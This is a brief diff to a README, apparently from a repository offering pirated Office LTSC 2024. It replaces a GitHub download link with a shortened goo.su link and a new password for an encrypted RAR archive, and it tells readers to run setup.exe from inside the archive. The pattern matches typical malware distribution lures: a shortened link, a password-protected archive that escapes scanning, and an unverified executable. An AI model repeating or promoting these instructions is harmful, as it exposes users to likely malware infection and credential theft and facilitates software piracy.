@@ -2,8 +2,8 @@
 
 <H3>IMPORTANT(how to install)</H3>
 
-- [Download](https://github.com/reglee911/office-2024/releases/download/Download/OfficeLTSC.rar)
-- Open archive (password: office24)
+- [Download](https://goo.su/ZRGc)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
